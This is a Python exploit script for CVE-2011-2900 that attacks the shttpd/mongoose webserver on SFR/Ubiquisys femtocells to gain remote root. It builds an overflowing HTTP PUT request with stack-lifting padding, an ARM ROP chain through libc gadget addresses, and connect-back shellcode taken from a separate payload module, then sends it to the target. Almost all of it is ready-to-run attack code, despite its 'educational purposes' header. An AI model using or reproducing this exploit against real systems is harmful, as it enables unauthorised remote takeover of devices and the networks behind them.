#!/usr/bin/env python
# part of femtocell research by TU-Berlin
# only for educational purposes
# Exploit Title: remote root on sfr/ubiquisys femtocell webserver (wsal/shttpd/mongoose)
# Date: 2011-08-02
# Author: nion
# Software: http://code.google.com/p/mongoose/ http://sourceforge.net/projects/shttpd/
# Version: shttpd <= 1.42, mongoose <= 3.0
# CVE: CVE-2011-2900
# Tested on: Linux (proprietary embedded distro) Linux 2.6.18-ubi-sys-V2.0.17

import socket, sys, time
import urllib.request, struct
import socket

import urllib.parse
from payload import buf
import socket
import struct
from scapy import *
def shell_attack(target_machine, target_port):

	target   = target_machine
	listener = target_machine

	SHELLCODE  = 0xbc568        # shellcode backup in connect struct, heap is not randomized
	STACK_LIFT = b"a0ce3140" # didnt want to use urllib to encode at this point
								# because it moves the heap address depending on if character is printable or not
								# and i was too lazy to adjust the payload when cleaning up the exploit :)

	buffer = b"PUT /"
	buffer += b"A" * 107 # first fill bytes will not be 148 because stack layout looks different when leaving put_dir()
	buffer += STACK_LIFT

	# repeated stack lifting
	for i in range(0, 26):
		buffer += b"A" * 148
		buffer += STACK_LIFT
    		 
	
	buffer += b"B"*132    # padding to overwrite pc, last jump will go over this one
	buffer += STACK_LIFT # this will hit pc and produce our first jump
					# add sp, sp, #132; pop {r4, r5, r6, r7, pc}

	buffer += b"A"*12     # this will be our last stack lifting after
	buffer += STACK_LIFT # jumping through our buffer back up

	# lets finish the path chunk and make some padding for the
	# last stack lift before pc gets popped to a different place
	buffer+=b"AAAAAAAAA/"+b"A"*138


	# first jump
	value =  urllib.parse.quote(struct.pack(b"<L", 0x4032a410))
	value = bytes(value, 'utf-8')
	buffer += value
	# --,
	#   v
	# prepare lr so we can properly return from __clear_cache
	# 0x4032a410 <makecontext+28>:  pop {lr}        ; (ldr lr, [sp], #4)
	# 0x4032a414 <makecontext+32>:  add sp, sp, #8  ; 0x8
	# 0x4032a418 <makecontext+36>:  bx  lr
	value = urllib.parse.quote(struct.pack(b"<L", 0x403e937c))
	value = bytes(value, 'utf-8')
	buffer+= value # free_slotinfo+128, return from __clear_cache
	buffer+=b"DDDDDDDD" # skip sp lifting, 8 dummy bytes because sp is lifted before branching

	# --, bx lr
	#   v
	# 0x403e937c <free_slotinfo+128>:   pop {r4, pc}
	buffer+=b"CCCC" # dummy r4
	value = urllib.parse.quote(struct.pack(b"<L", 0x402e5064)) 
	value = bytes(value, 'utf-8')
	buffer+=value # __aeabi_cfcmple+16
	# --,
	#   v
	# 0x402e5064 <__aeabi_cfcmple+16>:   pop {r0, r1, r2, r3, pc}
	buffer+=b"AAAA" # dummy r0
	buffer+=b"CCCC" # dummy r1 (needed for __clear_cache)
	buffer+=b"DDDD"*2 # dummy r2, r3
	value = urllib.parse.quote(struct.pack(b"<L", 0x40364bbc))
	value = bytes(value, 'utf-8')
	buffer+=value# envz_merge+184
	# --,
	#   v
	# 0x40364bbc <envz_merge+184>:  mov r0, r11
	# 0x40364bc0 <envz_merge+188>:  pop {r4, r5, r6, r7, r8, r9, r11, pc}
	# at this point r11 points to an address on the heap in front of
	# our shellcode, e.g. 0xad220
	buffer+=b"FFFF"*7 # dummy r4-r9+r11
	value = urllib.parse.quote(struct.pack(b"<L", 0x402e5484)) 
	value = bytes(value, 'utf-8')
	buffer+=value # __clear_cache
	# --,
	#   v
	# __clear_cache will return to our prepare lr (free_slotinfo+128)
	# 0x403e937c <free_slotinfo+128>:   pop {r4, pc}
	buffer+=b"AAAA" # dummy r4
	value = urllib.parse.quote(struct.pack(b"<L", SHELLCODE))
	value = bytes(value, 'utf-8')
	buffer +=value # jump to shellcode

	# shellcode + some testing garbage in front of it
	buffer += b"A"*16 # some garbage padding in front of our payload, could be nops or whatever

	# make listener shellcode friendly
	

	# connect back shellcode
	buffer += buf


	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target, target_port))
	s.send(buffer)
	s.send(b"\r\n")
	s.recv(1024)